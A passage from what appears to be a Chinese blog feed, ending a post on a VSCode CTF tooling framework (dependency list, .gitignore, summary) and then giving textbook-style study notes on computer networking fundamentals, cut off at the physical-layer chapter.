class="line">angr==9.2.52</span><br><span class="line">frida-tools==12.1.3</span><br><span class="line">unicorn==2.0.1.post1</span><br><span class="line">capstone==5.0.1</span><br><span class="line">keystone-engine==0.9.2</span><br><span class="line">numpy==1.24.2</span><br><span class="line">onnxruntime==1.14.1</span><br><span class="line">pythonnet==3.0.1</span><br><span class="line">requests==2.28.2</span><br><span class="line">pycryptodome==3.16.0</span><br><span class="line">scapy==2.5.0</span><br></pre></td></tr></table></figure></p><h3 id="2-Git版本控制配置"><a href="#2-Git版本控制配置" class="headerlink" title="2. Git版本控制配置"></a>2. Git版本控制配置</h3><p><strong>.gitignore</strong>文件内容：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 编译输出</span><br><span class="line">bin/</span><br><span class="line">obj/</span><br><span class="line">out/</span><br><span class="line">*.vsix</span><br><span class="line"></span><br><span class="line"># 环境文件</span><br><span class="line">.venv/</span><br><span class="line">.env</span><br><span class="line">Assets/Python/</span><br><span class="line"></span><br><span class="line"># VS Code配置</span><br><span class="line">.vscode/</span><br><span class="line">.history/</span><br><span class="line">*.code-workspace</span><br><span class="line"></span><br><span class="line"># 操作系统文件</span><br><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本方案提供了一个完整的基于VSCode的CTF工具开发框架，通过插件化架构支持功能扩展，集成了Python脚本能力以利用丰富的CTF工具库。开发流程涵盖了从环境搭建、项目配置、核心代码实现、插件开发到测试发布的全生命周期，所有源代码均可直接用于实际开发。</p><p>该工具特别适合CTF竞赛选手和安全研究者使用，通过VSCode的集成环境提供一致的用户体验，同时保持功能的可扩展性和灵活性。后续可进一步扩展支持更多CTF专项工具，如密码学分析、Web漏洞检测等插件。</p>]]></content>
      
      
      <categories>
          
          <category> 应用程序开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络技术知识点</title>
      <link href="/posts/1ad824a8.html"/>
      <url>/posts/1ad824a8.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>内容有点多, 可能有弄错的地方, 注意辨别</p></blockquote><h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h2 id="1-1-计算机网络在信息时代中的作用"><a href="#1-1-计算机网络在信息时代中的作用" class="headerlink" title="1.1 计算机网络在信息时代中的作用"></a>1.1 计算机网络在信息时代中的作用</h2><ol><li>21 世纪的重要特征：数字化，网络化，信息化</li><li>21 世纪是以网络为核心的信息时代</li><li>常见三类网络：电信网络，有线电视网络，计算机网络</li><li>Internet 的中文译名：</li></ol><ul><li>（1）因特网</li><li>（2）互联网：由数量极大的各种计算机网络互连起来</li></ul><ol><li>互联网具有两个重要的特点：连通性和共享</li></ol><ul><li>（1）连通性：互联网使上网用户之间不管相距多远，都可以非常方便的交换各种信息，好像这些用户中端是直接连通的</li><li>（2）共享：就是指资源共享，资源包括信息，软件，硬件</li></ul><ol><li>互联网+</li></ol><h2 id="1-2-互联网概述"><a href="#1-2-互联网概述" class="headerlink" title="1.2 互联网概述"></a>1.2 互联网概述</h2><h3 id="1-2-1-网络的网络"><a href="#1-2-1-网络的网络" class="headerlink" title="1.2.1 网络的网络"></a>1.2.1 网络的网络</h3><ol><li>计算机网络：由若干结点和连接这些结点的链路组成。<ul><li>结点包括：计算机，集线器，交换机，路由器</li></ul></li><li>互联网：网络之间通过路由器互连起来，就构成了一个覆盖范围更大的计算机网络，因此互联网是“网络中的网络”</li><li>网络：网络把许多计算机连接在一起，而互联网则把许多网络通过路由器连接在一起。与网络相连的计算机称为主机。</li><li>计算机网络的三种定义：<ul><li>广义观点：实现远程信息处理的系统或能进一步达到资源共享的系统</li><li>资源共享观点：以能够相互共享资源的方式互联起来的自治计算机系统的集合</li><li>用户透明性观点：存在一个能为用户自动管理资源的网络操作系统，它能够调用用户所需要的资源，而整个网络就像一个大的计算机系统一样对用户是透明的</li></ul></li></ol><h3 id="1-2-2-互联基础结构发展的三个阶段"><a href="#1-2-2-互联基础结构发展的三个阶段" class="headerlink" title="1.2.2 互联基础结构发展的三个阶段"></a>1.2.2 互联基础结构发展的三个阶段</h3><ol><li>第一阶段：单个网络 ARPANET 向互连网发展的过程<ul><li>互联网的雏形：单个的分组交换网 ARPANET</li><li>1983 年 TCP/IP 协议成为 ARPANET 的标准协议</li><li>internet（互连网）：泛指由多个计算机网络互连而成的计算机网络</li><li>Internet（互联网）：指当前全球最大的，开放的，由众多网络相互连接而成的特定互连网，它采用 TCP/IP 协议族作为通信的规则，且前身为美国的 ARPANET</li></ul></li><li>第二阶段：三级结构的互联网<ul><li>三级计算机网络：主干网，地区网，校园网（或企业网）</li></ul></li><li>第三阶段：形成了多层次的 ISP 结构的互联网<ul><li>互联网服务提供者 ISP</li><li>流程：<ul><li>（1）ISP 向互联网管理机构申请很多 IP 地址，同时拥有通信线路以及路由器等连网设备</li><li>（2）任何机构和个人只要向某个 ISP 交纳规定的费用，就可以从该 ISP 获取所需 IP 地址的使用权，并可通过该 ISP 接入到互联网</li></ul></li><li>ISP 层次：主干 ISP，地区 ISP，本地 ISP</li></ul></li><li>互联网交换点 IXP：<ul><li>作用：允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组。</li><li>IXP 常采用工作在数据链路层的网络交换机，这些网络交换机都用局域网互连起来</li></ul></li><li>万维网 WWW：<ul><li>万维网（亦作“Web”、“WWW”、“’W3’”，英文全称为“World Wide Web”），是一个由许多互相链接的超文本组成的系统，通过互联网访问。在这个系统中，每个有用的事物，称为一样“资源”；并且由一个全局“统一资源标识符”（URI）标识；这些资源通过超文本传输协议（Hypertext Transfer Protocol）传送给用户，而后者通过点击链接来获得资源。</li><li>万维网联盟（英语：World Wide Web Consortium，简称 W3C），又称 W3C 理事会。1994 年 10 月在麻省理工学院（MIT）计算机科学实验室成立。万维网联盟的创建者是万维网的发明者蒂姆・伯纳斯 - 李。<br>—百度百科</li></ul></li></ol><h3 id="1-2-3-互联网的标准化工作"><a href="#1-2-3-互联网的标准化工作" class="headerlink" title="1.2.3 互联网的标准化工作"></a>1.2.3 互联网的标准化工作</h3><ul><li>互联网协会（ISOC）<ul><li>互联网体系结构委员会 IAB<ul><li>互联网工程部 IETF<ul><li>互联网工程指导小组 IESG：主要针对协议的开发和标准化</li></ul></li><li>互联网研究部 IRTF<ul><li>互联网研究指导小组 IRSG：（RFC“请求评论”）<ul><li>指定互联网标准的三个阶段：<ul><li>（1）互联网草案</li><li>（2）建议标准</li><li>（3）互联网标准</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="1-3-互联网的组成"><a href="#1-3-互联网的组成" class="headerlink" title="1.3 互联网的组成"></a>1.3 互联网的组成</h2><ul><li>从工作方式上看：<ul><li>（1）边缘部分：用户直接使用的部分（主机）</li><li>（2）核心部分：为边缘部分提供服务的（连通性和交换）（网络和路由器）</li></ul></li><li>从组成部分来看：<ul><li>（1）硬件</li><li>（2）软件</li><li>（3）协议</li></ul></li><li>从功能组成上来看：<ul><li>（1）通信子网（数据传输，交换，控制，存储）</li><li>（2）资源子网（实现硬件，软件，数据资源共享的设备及其软件的集合）</li></ul></li></ul><h3 id="1-3-1-互联网的边缘部分"><a href="#1-3-1-互联网的边缘部分" class="headerlink" title="1.3.1 互联网的边缘部分"></a>1.3.1 互联网的边缘部分</h3><ul><li>端系统：处在互联网边缘的部分就是连接在互联网上的所有的主机。这些主机又称为端系统</li><li>端系统之间的通信方式：客户 - 服务器方式 (C/S)；对等方式 (P2P)</li></ul><h4 id="客户-服务器方式："><a href="#客户-服务器方式：" class="headerlink" title="客户 - 服务器方式："></a>客户 - 服务器方式：</h4><ul><li>主机 A 运行客户程序 &lt; - - - - &gt; 主机 B 运行服务器程序<ul><li>A 向 B 发出服务请求，B 向 A 提供服务</li><li>客户是服务的请求方，服务器是服务的提供方</li><li>对于客户程序：<ul><li>（1）被用户调用后运行，通信时主动向远地服务器发起通信，因此客户程序必须知道服务器程序的地址</li><li>（2）不需要特殊的硬件和很复杂的操作系统</li></ul></li><li>对于服务器程序：<ul><li>（1）是一种专门来提供某种服务的程序，可同时处理多个客户请求</li><li>（2）系统启动后自动调用并不断运行，被动等待接受来自各地的客户的请求，因此服务器不需要知道客户程序的地址</li><li>（3）一般需要有强大的硬件和高级的操作系统支持</li></ul></li></ul></li></ul><h4 id="对等连接方式：P2P"><a href="#对等连接方式：P2P" class="headerlink" title="对等连接方式：P2P"></a>对等连接方式：P2P</h4><ul><li>P2P 方式：只要两台主机都运行了对等连接软件（P2P 软件），就能进行平等的，对等连接通信</li></ul><h3 id="1-3-2-互联网的核心部分"><a href="#1-3-2-互联网的核心部分" class="headerlink" title="1.3.2 互联网的核心部分"></a>1.3.2 互联网的核心部分</h3><ul><li>在网络中心起特殊作用的是路由器，它是一种专用计算机（但不叫主机）</li><li>路由器是实现分组交换的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能</li><li>互联网的核心部分是由许多网络和把它们互连起来的路由器组成，而主机处在互联网的边缘部分</li><li>互联网核心部分中的路由器之间一般是用高速链路连接，而在网络边缘的主机接入到核心部分则通常以相对较低速率的链路相连接</li><li>电路交换的特点<ul><li>N 部电话机两两直接相连，需 N(N – 1)/2 对电线。这种直接连接方法所需要的电线对的数量与电话机数量的平方（ N2 ）成正比。</li><li>当电话机的数量增多时，就要使用交换机来完成全网的交换任务。</li><li>电路交换 (circuit switching)：每一部电话都直接连接到交换机上，而交换机使用交换的方法，让电话用户彼此之间可以很方便地通信。<ul><li>交换：按照某种方式动态的分配传输线路的资源</li></ul></li><li>电路交换必定是面向连接的</li><li>电路交换的三个阶段：<ul><li>（1）建立连接：（占用通信资源）</li><li>（2）通信：（一直占用）</li><li>（3）释放连接：（归还通信资源）</li></ul></li><li>在通话的全部时间内，通话的两个用户始终占用端到端的通信资源（利用率低）</li><li>计算机数据具有突发性</li></ul></li></ul><h4 id="分组交换的主要特点："><a href="#分组交换的主要特点：" class="headerlink" title="分组交换的主要特点："></a>分组交换的主要特点：</h4><ul><li>分组交换网采用存储转发技术</li><li>分组交换是面向无连接的</li><li>Internet 网络层是分组交换</li><li>报文：要发送的整块数据</li><li>在发送端，先把较长的报文划分成较短的，固定长度的数据段</li><li>在每一个数据段前面添加上首部构成分组，分组又叫“包”，而分组的首部也可以称为“包头”</li><li>主机是为用户进行信息处理的；路由器则是用来转发分组的，即进行分组交换</li><li>分组是在互联网中传送的数据单元。依次把各分组发送到接收端</li><li>分组的首部包含了目的地址，源地址等重要控制信息。</li><li>分组交换网中的结点交换机根据收到的分组首部的地址信息，把分组转发到下一个结点交换机</li><li>每一个分组在互联网中独立地选择传输路径</li><li>接收端收到分组后剥去首部还原成报文</li><li>路由器处理分组的过程：<ul><li>（1）把收到的分组先放入缓存（暂时存储）</li><li>（2）查找转发表，找出到某个目的地址应从哪个端口转发</li><li>（3）把分组送到适当的端口转发出去</li></ul></li></ul><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h5><div class="table-container"><table><thead><tr><th>优点</th><th>所采用的手段</th></tr></thead><tbody><tr><td>高效</td><td>在分组传输过程中动态分配传输带宽，对通信链路是逐段占用</td></tr><tr><td>灵活</td><td>为每一个分组独立地选择最合适的转发路由</td></tr><tr><td>迅速</td><td>以分组作为传送单位，可以不先建立连接就能向其他主机发送分组</td></tr><tr><td>可靠</td><td>保证可靠性的网络协议；分布式多路由的分组交换网，使网络有很好的生存性</td></tr></tbody></table></div><h5 id="分组交换带来的问题："><a href="#分组交换带来的问题：" class="headerlink" title="分组交换带来的问题："></a>分组交换带来的问题：</h5><ul><li>（1）分组在各结点存储转发时需要排队，这就会造成一定的时延。</li><li>（2）分组必须携带的首部（里面有必不可少的控制信息）也造成了一定的开销。</li></ul><h4 id="三种交换的比较："><a href="#三种交换的比较：" class="headerlink" title="三种交换的比较："></a>三种交换的比较：</h4><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFaTjU.png" alt="nFaTjU.png"></p><ul><li>电路交换：整个报文的比特流连续地从源点直达终点，好像在一个管道中传送（面向连接）</li><li>报文交换：整个报文先传送到相邻结点，全部存储下来后查询转发表，转发到下一个结点。（面向无连接）</li><li>分组交换：单个分组传送到相邻结点，存储下来后查找转发表，转发到下一个结点（面向无连接）</li></ul><h2 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h2><ul><li>规模最大的就是下面这五个：<ul><li>(1) 中国电信互联网 CHINANET（也就是原来的中国公用计算机互联网）</li><li>(2) 中国联通互联网 UNINET</li><li>(3) 中国移动互联网 CMNET</li><li>(4) 中国教育和科研计算机网 CERNET</li><li>(5) 中国科学技术网 CSTNET</li></ul></li></ul><h2 id="1-5-计算机网络的类别"><a href="#1-5-计算机网络的类别" class="headerlink" title="1.5 计算机网络的类别"></a>1.5 计算机网络的类别</h2><h3 id="1-5-1-计算机网络的定义"><a href="#1-5-1-计算机网络的定义" class="headerlink" title="1.5.1 计算机网络的定义"></a>1.5.1 计算机网络的定义</h3><ul><li>定义：计算机网络主要是由一些通用的、可编程的硬件互连而成的，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程的硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用。</li><li>根据定义：<ul><li>（1）计算机网络所连接的硬件，并不限于一般的计算机，而是包括了智能手机。</li><li>（2）计算机网络并非专门用来传送数据，而是能够支持很多种的应用（包括今后可能出现的各种应用）</li></ul></li><li>可编程的硬件表明这种硬件一定包含有中央处理机 CPU</li></ul><h3 id="1-5-2-计算机网络的类别"><a href="#1-5-2-计算机网络的类别" class="headerlink" title="1.5.2 计算机网络的类别"></a>1.5.2 计算机网络的类别</h3><h4 id="按照网络的作用范围进行分类："><a href="#按照网络的作用范围进行分类：" class="headerlink" title="按照网络的作用范围进行分类："></a>按照网络的作用范围进行分类：</h4><ul><li>（1）广域网 WAN</li><li>（2）城域网 MAN</li><li>（3）局域网 LAN</li><li><p>（4）个人区域网 PAN</p><ul><li>无线个人区域网 WPAN</li></ul></li><li><p>若中央处理机之间的距离非常近（如仅 1 米的数量级甚至更小些），则一般就称之为多处理机系统，而不称它为计算机网络。</p></li></ul><h4 id="按照网络使用者分类："><a href="#按照网络使用者分类：" class="headerlink" title="按照网络使用者分类："></a>按照网络使用者分类：</h4><ul><li>（1）公用网</li><li>（2）专用网</li></ul><h4 id="用来把用户接入到互联网的网络"><a href="#用来把用户接入到互联网的网络" class="headerlink" title="用来把用户接入到互联网的网络"></a>用来把用户接入到互联网的网络</h4><ul><li>接入网 AN，它又称为本地接入网或居民接入网</li><li>接入网是一类比较特殊计算机网络，用于讲用户接入互联网</li><li>接入网本身既不属于互联网的核心部分，也不属于互联网的边缘部分。</li><li>接入网是从某个用户端系统到互联网中的第一个路由器（也称为边缘路由器）之间的一种网络。</li></ul><h2 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h2><h3 id="1-6-1-计算机网络的性能指标"><a href="#1-6-1-计算机网络的性能指标" class="headerlink" title="1.6.1 计算机网络的性能指标"></a>1.6.1 计算机网络的性能指标</h3><ol><li><p><strong>速率</strong>：</p><ul><li>比特（bit）是计算机中数据量的单位，也是信息论中使用的信息量的单位。</li><li>速率是计算机网络中最重要的一个性能指标，指的是数据的传送速率，它也称为数据率 (data rate)或比特率 (bit rate)。</li><li>速率的单位是 bit/s，或 kbit/s、Mbit/s、Gbit/s 等。例如 4×10¹⁰ bit/s 的数据率就记为 40 Gbit/s。</li><li>速率往往是指额定速率或标称速率，非实际运行速率。</li></ul></li><li><p><strong>带宽</strong>：</p><ul><li>两种不同意义：<ul><li>（1）“带宽”(bandwidth) 本来是指信号具有的频带宽度，其单位是赫（或千赫、兆赫、吉赫等）。（频域）</li><li>（2）在计算机网络中，带宽用来表示网络中某通道传送数据的能力。表示在单位时间内网络中的某信道所能通过的“最高数据率”。单位是 bit/s ，即 “比特每秒”（时域）</li></ul></li></ul></li><li><p><strong>吞吐量</strong>：</p><ul><li>吞吐量 (throughput) 表示在单位时间内通过某个网络（或信道、接口）的数据量。</li><li>吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。</li><li>吞吐量受网络的带宽或网络的额定速率的限制。</li></ul></li><li><p><strong>时延</strong>：</p><ul><li>时延是指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间。</li><li>有时也称为延迟或迟延。</li><li>网络中的时延由以下几个不同的部分组成：<ul><li>(1) 发送时延（传输时延）：指主机或路由器发送数据帧所需要的时间<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFdpjO.png" alt="nFdpjO.png"></li></ul></li><li>(2) 传播时延：是电磁波在信道中传播一定的距离需要花费的时间<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFdCuD.png" alt="nFdCuD.png"></li></ul></li></ul></li><li>发送时延发送在机器内部的发送器中，与传输信道的长度无关，传播时延发生在机器外部的传输信道媒体上，与信号的发送速率无关。信号传送的距离越远，传播时延就越大</li><li>(3) 处理时延<ul><li>主机或路由器在收到分组时，为处理分组（例如分析首部、提取数据、差错检验或查找路由）所花费的时间。</li></ul></li><li>(4) 排队时延<ul><li>分组在路由器输入输出队列中排队等待处理所经历的时延。</li><li>排队时延的长短往往取决于网络中当时的通信量。</li></ul></li></ul><p>总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延</p><ul><li>对于高速网络链路，我们提高的仅仅是数据的发送速率而不是比特在链路上的传播速率。</li><li>提高链路带宽减小了数据的发送时延。</li></ul></li><li><p><strong>时延带宽积</strong>：</p><ul><li>链路的时延带宽积又称为以比特为单位的链路长度。<ul><li><img src="/img/net_work/nFweo9.png" alt="nFweo9.png" width="300" height="auto"></li></ul></li><li>只有在代表链路的管道都充满比特时，链路才得到了充分利用。</li></ul></li><li><p><strong>往返时间 RTT</strong>：</p><ul><li>互联网上的信息不仅仅单方向传输，而是双向交互的。因此，有时很需要知道双向交互一次所需的时间。</li><li>往返时间表示从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。</li><li>在互联网中，往返时间还包括各中间结点的处理时延、排队时延以及转发数据时的发送时延。</li><li>发送时间 = 数据长度 / 发送速率</li><li>有效数据率 = 数据长度 /（发送时间 + RTT）</li></ul></li><li><p><strong>利用率</strong>：</p><ul><li>利用率分为信道利用率和网络利用率</li><li>信道利用率不是越高越好，根据排队论的理论，当某信道的利用率增大时，该信道引起的时延也就迅速增加。</li><li>若令 D₀ 表示网络空闲时的时延，D 表示网络当前的时延，则在适当的假定条件下，可以用下面的简单公式表示 D 和 D₀ 之间的关系：<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFwJdH.png" alt="nFwJdH.png"></li></ul></li><li>信道或网络利用率过高会产生非常大的时延</li></ul></li></ol><h3 id="1-6-2-计算机网络的非性能指标"><a href="#1-6-2-计算机网络的非性能指标" class="headerlink" title="1.6.2 计算机网络的非性能指标"></a>1.6.2 计算机网络的非性能指标</h3><ol><li>费用</li><li>质量</li><li>标准化</li><li>可靠性</li><li>可扩展性和可升级性</li><li>易于管理和维护</li></ol><h2 id="1-7-计算机网络体系结构"><a href="#1-7-计算机网络体系结构" class="headerlink" title="1.7 计算机网络体系结构"></a>1.7 计算机网络体系结构</h2><h3 id="1-7-1-计算机网络体系结构的形成"><a href="#1-7-1-计算机网络体系结构的形成" class="headerlink" title="1.7.1 计算机网络体系结构的形成"></a>1.7.1 计算机网络体系结构的形成</h3><ul><li>计算机网络是个非常复杂的系统。</li><li>相互通信的两个计算机系统必须高度协调工作才行，而这种“协调”是相当复杂的。</li><li>“分层”可将庞大而复杂的问题，转化为若干较小的局部问题，而这些较小的局部问题就比较易于研究和处理。</li><li>1974 年，美国的 IBM 公司宣布了系统网络体系结构 SNA (System Network Architecture)。这个著名的网络标准就是按照分层的方法制定的。</li><li>由于网络体系结构的不同，不同公司的设备很难互相连通。</li><li>为了使不同体系结构的计算机网络都能互连，国际标准化组织 ISO 于 1977 年成立了专门机构研究该问题。他们提出了一个试图使各种计算机在世界范围内互连成网的标准框架，即著名的开放系统互连基本参考模型 OSI/RM (Open Systems Interconnection Reference Model)，简称为 OSI。</li><li>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</li><li>开放是指非独家垄断，系统是指在现实的系统中与互连有关的各部分</li><li>OSI 只获得了一些理论研究的成果，在市场化方面却失败了</li><li>法律上的国际标准 OSI 并没有得到市场的认可。非国际标准 TCP/IP 却获得了最广泛的应用。TCP/IP 常被称为事实上的国际标准。</li></ul><h3 id="1-7-2-协议与划分层次"><a href="#1-7-2-协议与划分层次" class="headerlink" title="1.7.2 协议与划分层次"></a>1.7.2 协议与划分层次</h3><ul><li>计算机网络中的数据交换必须遵守事先约定好的规则。这些规则明确规定了所交换的数据的格式以及有关的同步问题（同步含有时序的意思）。</li><li>网络协议 (network protocol)，简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定。</li><li>协议主要由以下三个要素组成：<ul><li>（1）语法：数据与控制信息的结构或格式</li><li>（2）语义：需要发出何种控制信息，完成何种动作以及做出何种响应</li><li>（3）同步：事件实现顺序的详细说明</li></ul></li><li>协议的两种形式：<ul><li>（1）一种是使用便于人来阅读和理解的<strong>文字描述</strong>。</li><li>（2）另一种是使用让计算机能够理解的<strong>程序代码</strong>。<ul><li>这两种不同形式的协议都必须能够对网络上信息交换过程做出精确的解释。</li></ul></li></ul></li><li>分层的好处：<ul><li>（1）各层之间是独立的。</li><li>（2）灵活性好。</li><li>（3）结构上可分割开。</li><li>（4）易于实现和维护。</li><li>（5）能促进标准化工作</li></ul></li><li>缺点：<ul><li>（1）降低效率。</li><li>（2）有些功能会在不同的层次中重复出现，因而产生了额外开销。</li></ul></li><li>通常各层要完成的功能：<ul><li>（1）差错控制</li><li>（2）流量控制</li><li>（3）分段和重装</li><li>（4）复用和分用</li><li>（5）连接建立和释放</li></ul></li><li>计算机网络的体系结构 (architecture) 是计算机网络的各层及其协议的集合。</li><li>体系结构就是这个计算机网络及其部件所应完成的功能的精确定义。</li><li>实现 (implementation) 是遵循这种体系结构的前提下用何种硬件或软件完成这些功能的问题。</li><li>体系结构是抽象的，而实现则是具体的，是真正在运行的计算机硬件和软件。</li></ul><h3 id="1-7-3-具有五层协议的体系结构"><a href="#1-7-3-具有五层协议的体系结构" class="headerlink" title="1.7.3 具有五层协议的体系结构"></a>1.7.3 具有五层协议的体系结构</h3><ul><li><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFwNFA.png" alt="nFwNFA.png"></p><ol><li><p><strong>应用层</strong>：</p><ul><li>通过应用进程间的交互来完成特定网络应用</li><li>应用层协议定义的是应用程序间通信和交互的规则</li><li>例如：域名系统 DNS，支持万维网应用的 HTTP 协议，支持电子邮件的 SMTP 协议</li><li>我们把应用层交互的数据单元称为报文</li></ul></li><li><p><strong>运输层</strong>：</p><ul><li>负责向两台主机中进程之间的通信提供通用的数据传输服务</li><li>两种主要协议：<ul><li><strong>传输控制协议 TCP</strong>：面向连接，其数据传输的单位是报文段</li><li><strong>用户数据报协议 UDP</strong>：面向无连接，尽最大努力，数据传输的单位是用户数据报</li></ul></li></ul></li><li><p><strong>网络层</strong>：</p><ul><li>负责为分组交换网上的不同主机提供通信服务</li><li>在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组或包进行传输</li><li>在 TCP/IP 协议中，分组称为 IP 数据报</li><li>互联网是由大量异构网络通过路由器相互连接起来的。</li><li>互联网使用的网络层协议是无连接的网络协议 IP 和许多种路由选择协议</li></ul></li><li><p><strong>数据链路层</strong>：</p><ul><li>数据链路层将网络层交下来的 IP 数据报组装成帧，在两个相邻结点间的链路上传送帧。每一帧包括数据和必要的控制信息</li><li>控制信息可以使接受端能检测到所接收的帧有无差错，有则丢弃。</li></ul></li><li><p><strong>物理层</strong>：</p><ul><li>在物理层上所传输的数据的单位是比特。<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFw0Qf.png" alt="nFw0Qf.png"></li></ul></li><li>PDU (Protocol Data Unit)：协议数据单元。<ul><li>OSI 参考模型把对等层次之间传送的数据单位称为该层的协议数据单元 PDU。</li></ul></li><li>任何两个同样的层次把数据（即数据单元加上控制信息）通过水平虚线直接传递给对方。这就是所谓的“对等层”之间的通信。</li><li>各层协议实际上就是在各个对等层之间传递数据时的各项规定。</li></ul></li></ol></li></ul><h3 id="1-7-4-实体，协议，服务和服务访问点"><a href="#1-7-4-实体，协议，服务和服务访问点" class="headerlink" title="1.7.4 实体，协议，服务和服务访问点"></a>1.7.4 实体，协议，服务和服务访问点</h3><ul><li><strong>实体</strong> (entity) 表示任何可发送或接收信息的硬件或软件进程。</li><li><strong>协议</strong> 是控制两个对等实体进行通信的规则的集合。</li><li>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。</li><li>要实现本层协议，还需要使用下层所提供的服务。</li><li>协议的实现保证了能够向上一层提供服务。</li><li>本层的服务用户只能看见服务而无法看见下面的协议。即下面的协议对上面的服务用户是透明的。</li><li>协议是“水平的”，即协议是控制对等实体之间通信的规则。</li><li>服务是“垂直的”，即服务是由下层向上层通过层间接口提供的。</li><li>上层使用服务原语获得下层所提供的服务。</li><li>同一系统相邻两层的实体进行交互的地方，称为服务访问点 SAP (Service Access Point)。</li><li>服务访问点 SAP 是一个抽象的概念，它实际上就是一个逻辑接口。</li><li>OSI 把层与层之间交换的数据的单位称为服务数据单元 SDU (Service Data Unit)。</li><li>SDU 可以与 PDU 不一样，例如，可以是多个 SDU 合成为一个 PDU，也可以是一个 SDU 划分为几个 PDU。</li><li>协议必须把所有不利的条件事先都估计到，而不能假定一切都是正常的和非常理想的。</li><li>看一个计算机网络协议是否正确，不能光看在正常情况下是否正确，还必须非常仔细地检查这个协议能否应付各种异常情况。</li></ul><h3 id="1-7-5-TCP-IP-的体系结构"><a href="#1-7-5-TCP-IP-的体系结构" class="headerlink" title="1.7.5 TCP/IP 的体系结构"></a>1.7.5 TCP/IP 的体系结构</h3><ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFwfS0.png" alt="图像 1"></li><li>另一种表示方法：<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFw4yT.png" alt="图像 2"></li></ul></li><li>还有一种表示方法：<ul><li><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/nFwTw4.png" alt="图像 3"></li></ul></li><li>TCP/IP 协议可以为各式各样的应用提供服务，允许 IP 协议在各式各样的网络构成的互联网上运行。</li></ul><h1 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h1><h2 id="2-1-物理层的基本概念"><a href="#2-1-物理层的基本概念" class="headerlink" title="2.1 物理层的基本概念"></a>2.1 物理层的基本概念</h2><ol><li>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</li><li>物理层的作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异。用于物理层的协议也常称为物理层规程 (procedure)。</li><li>物理层的主要任务描述为确定与传输媒体的接口有关的一些特性：<ul><li>（1）机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等。</li><li>（2）电气特性：指明在接口电缆的各条线上出现的电压的范围。</li><li>（3）功能特性：指明某条线上出现的某一电平的电压表示何种意义。</li><li>（4）过程特性：指明对于不同功能的各种可能事件的出现顺序。</li></ul></li><li>数据在计算机内部多采用并行传输方式，但在通信线路的传输方式一般都是串行传输</li></ol><h2 id="2-2-数据通信的基础知识"><a href="#2-2-数据通信的基础知识" class="headerlink" title="2.2 数据通信的基础知识"></a>2.2 数据通信的基础知识</h2><h3 id="2-2-1-数据通信系统的模型"><a href="#2-2-1-数据通信系统的模型" class="headerlink" title="2.2.1 数据通信系统的模型"></a>2.2.1 数据通信系统的模型</h3><ol><li>一个数据通信系统可以分为三个部分：<ul><li>（1）源系统（发送端，发送方）</li><li>（2）传输系统（传输网络）</li><li>（3）目的系统（接收端，接受方）</li></ul></li><li>源系统包括：<ul><li>源点</li><li>发送器</li><li>接收器</li><li>终点</li></ul></li><li>常用术语：<ul><li>通信的目的是传送消息。</li><li>数据是运送消息的实体</li><li>信号则是数据的电气或电磁的表现<ul><li>模拟信号（连续信号）：消息的参数的取值是连续的</li><li>数字信号（离散信号）：消息的参数的取值是离散的</li></ul></li></ul></li></ol><h3 id="2-2-2-有关信道的几个基本概念"><a href="#2-2-2-有关信道的几个基本概念" class="headerlink" title="2.2.2 有关信道的几个基本概念"></a>2.2.2 